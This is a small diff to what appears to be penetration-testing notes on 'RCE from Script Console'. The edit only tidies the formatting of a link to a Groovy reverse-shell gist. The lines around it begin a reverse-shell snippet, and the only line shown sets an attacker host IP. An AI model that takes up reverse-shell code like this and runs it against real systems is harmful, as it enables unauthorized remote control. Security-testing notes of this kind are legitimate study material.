@@ -2,7 +2,7 @@
 
 ## RCE from Script Console
 
-> From [frohoff/**revsh.groovy**](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)****
+> From [frohoff/**revsh.groovy**](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 
 ```bash
 String host="10.10.14.5";
